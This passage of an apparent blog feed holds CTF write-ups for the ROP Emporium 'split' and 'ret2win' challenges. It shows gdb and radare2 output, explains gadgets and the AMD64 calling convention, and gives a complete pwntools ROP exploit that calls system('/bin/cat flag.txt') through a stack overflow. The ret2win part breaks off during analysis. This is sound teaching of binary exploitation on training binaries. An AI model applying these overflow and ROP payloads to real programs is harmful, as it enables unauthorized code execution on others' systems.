&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) di&lt;span style=&#34;color:#ef6155&#34;&gt;sas&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;usefulFunction&lt;/span&gt; 
&lt;span style=&#34;color:#06b6ef&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;usefulFunction&lt;/span&gt;:
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400742&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;push&lt;/span&gt;   rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400743&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rbp,rsp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400746&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,&lt;span style=&#34;color:#f99b15&#34;&gt;0x40084a&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000000000040074b&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x400560&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;system@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400750&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;nop&lt;/span&gt;
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400751&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;15&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbp
   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400752&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x40084a&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;x40084a:	&lt;span style=&#34;color:#ef6155&#34;&gt;&amp;#34;/&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;bin&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;ls&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Goal is to pass a different string to the system function instead of  &lt;strong&gt;&amp;quot;/bin/ls&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;From the authors hint, we can look for useful hints in the binary using either radare2 or rizin. Both tools perform the same function, it is a matter of choice.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Now that you&amp;rsquo;ve gathered the elements of your exploit you can start to piece them together, you want to call system() with the &lt;strong&gt;&amp;quot;/bin/cat flag.txt&amp;quot;&lt;/strong&gt; string as the only argument. You&amp;rsquo;ll also have to start dealing with the differences between the various architectures&#39; calling conventions.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Opening the binary in radare2, we can use &lt;strong&gt;iz&lt;/strong&gt; command to look for strings. The goal is to read the flag from the system.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;[0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x004005b0&lt;/span&gt;]&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;iz&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;nth&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;paddr&lt;/span&gt;      &lt;span style=&#34;color:#ef6155&#34;&gt;vaddr&lt;/span&gt;      &lt;span style=&#34;color:#ef6155&#34;&gt;len&lt;/span&gt; si&lt;span style=&#34;color:#ef6155&#34;&gt;ze&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;section&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;type&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;string&lt;/span&gt;                                      
&lt;span style=&#34;color:#ef6155&#34;&gt;---------------------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000007e8&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x004007e8&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;21&lt;/span&gt;  &lt;span style=&#34;color:#f99b15&#34;&gt;22&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;.rodata&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ascii&lt;/span&gt; sp&lt;span style=&#34;color:#ef6155&#34;&gt;lit&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ROP&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;Emporium&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;1&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x000007fe&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x004007fe&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;7&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;.rodata&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ascii&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;x86_64&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;n&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;2&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000806&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x00400806&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;9&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;.rodata&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ascii&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;nExiting&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;3&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000810&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x00400810&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;43&lt;/span&gt;  &lt;span style=&#34;color:#f99b15&#34;&gt;44&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;.rodata&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ascii&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;Contriving&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;reason&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ask&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;data...&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;4&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000083f&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x0040083f&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;10&lt;/span&gt;  &lt;span style=&#34;color:#f99b15&#34;&gt;11&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;.rodata&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ascii&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;Thank&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;you&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;!&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000084a&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x0040084a&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;7&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;.rodata&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ascii&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;bin&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;ls&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00001060&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0x00601060&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;17&lt;/span&gt;  &lt;span style=&#34;color:#f99b15&#34;&gt;18&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;.data&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;ascii&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;bin&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;cat&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;flag.txt&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have an important string &lt;strong&gt;&amp;quot;/bin/cat flag.txt&amp;quot;&lt;/strong&gt; which will enable us to complete our goal. Now we need pass the string to system function as follows &lt;strong&gt;system(&#39;/bin/cat flag.txt&#39;)&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;For building ropchain, we need to understand the calling conventions of &lt;strong&gt;AMD64 ABI&lt;/strong&gt;.The calling convention passes the arguments to the registers in the following order &lt;strong&gt;RDI, RSI, RDX, RCX, R8 and R9&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Because the system function receives one argument, we need to look for one gadgets that we control the &lt;strong&gt;rdi&lt;/strong&gt; address.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What are gadgets?&lt;/strong&gt;
Gadgets are sequence of instructions the end with ret instruction. Because we want to load a value into rdi register, we look for a pop &lt;strong&gt;pop rdi; ret&lt;/strong&gt; instruction in order to pass an argument to the system function.&lt;/p&gt;
&lt;p&gt;For searching gadget in radare2/rizin, use &lt;strong&gt;/R&lt;/strong&gt; command as shown in the image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/split_poprdi.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/split_poprdi.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;
Now we need to chain ropchain exploit as shown in the image below.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/popgadget.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/popgadget.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;ropchain&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;ropchain&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The goal is to overwrite the return address with the address of &lt;strong&gt;&amp;ldquo;pop rdi, ret &amp;ldquo;&lt;/strong&gt; and then call system function. we need to fill the buffer memory with 32bytes, 8 bytes more to overwrite the rbp address and  8 bytes teo overwrite the return address with pop rdi address.&lt;/p&gt;
&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;p&gt;Full exploit of split challenge is;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;pwn&lt;/span&gt;

pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;encoding &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;latin-1&amp;#34;&lt;/span&gt;
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;warnings&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;simplefilter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;ignore&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;arch &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;

io &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;./split&amp;#34;&lt;/span&gt;)

system_addr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x400560&lt;/span&gt;)   &lt;span style=&#34;color:#776e71&#34;&gt;#address of system &lt;/span&gt;
pop_rdi_ret &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x004007c3&lt;/span&gt;)  &lt;span style=&#34;color:#776e71&#34;&gt;# pop rdi; ret gadget &lt;/span&gt;
bin_cat_addr &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#f99b15&#34;&gt;0x00601060&lt;/span&gt;)  &lt;span style=&#34;color:#776e71&#34;&gt;#bin cat flag.txt address &lt;/span&gt;

payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;32&lt;/span&gt;  &lt;span style=&#34;color:#776e71&#34;&gt;#fill the buffer &lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#48b685&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;   &lt;span style=&#34;color:#776e71&#34;&gt;# overwrite  rbp&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; pop_rdi_ret &lt;span style=&#34;color:#776e71&#34;&gt;# pop rdi gadget &lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; bin_cat_addr &lt;span style=&#34;color:#776e71&#34;&gt;# argument passed to the system function&lt;/span&gt;
payload &lt;span style=&#34;color:#5bc4bf&#34;&gt;+=&lt;/span&gt; system_addr   &lt;span style=&#34;color:#776e71&#34;&gt;#call system &lt;/span&gt;

io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;writeafter(&lt;span style=&#34;color:#48b685&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;, payload)

pwn&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;info(io&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;clean()&lt;span style=&#34;color:#5bc4bf&#34;&gt;.&lt;/span&gt;decode())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running the above code we get a flag.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/split_flag.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/split_flag.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Return-Oriented Programming - Ret2win</title>
        <link>https://thuri10.github.io/p/return-oriented-programming-ret2win/</link>
        <pubDate>Mon, 20 Dec 2021 20:49:23 +0300</pubDate>
        
        <guid>https://thuri10.github.io/p/return-oriented-programming-ret2win/</guid>
        <description>&lt;img src="https://thuri10.github.io/post/ropemporium/ret2win.jpg" alt="Featured image of post Return-Oriented Programming - Ret2win" /&gt;&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Challenge description&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.&lt;/p&gt;
&lt;p&gt;The binaries for the challenges can be downloaded from the author`s website &lt;a class=&#34;link&#34; href=&#34;https://ropemporium.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ropemporium&lt;/a&gt;.The goal of first challenge is to call the &lt;strong&gt;ret2win&lt;/strong&gt; function.&lt;/p&gt;
&lt;p&gt;After downloading the binary, the first thing is to check the binary protection enabled on the binary using checksec utility.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;vx@archie:ret2win$ checksec --file ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#5bc4bf&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#5bc4bf&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Only &lt;strong&gt;NX&lt;/strong&gt; (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like shellcode.and the behavior of this program we will use gdb. gdb is a tools that enables to inspect the behavior of binaries at runtime.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;info&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;functions&lt;/span&gt;
&lt;span style=&#34;color:#06b6ef&#34;&gt;All&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;defined&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;functions&lt;/span&gt;:

&lt;span style=&#34;color:#06b6ef&#34;&gt;Non&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;symbols&lt;/span&gt;:
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400528&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;_init&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400550&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400560&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;system@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400570&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;printf@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400580&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;memset@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400590&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;read@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004005a0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;setvbuf@plt&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004005b0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;_start&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004005e0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;_dl_relocate_static_pie&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000004005f0&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;deregister_tm_clones&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400620&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;register_tm_clones&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400660&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;__do_global_dtors_aux&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x0000000000400690&lt;/span&gt;  &lt;span style=&#34;color:#ef6155&#34;&gt;frame_dummy&lt;/span&gt;
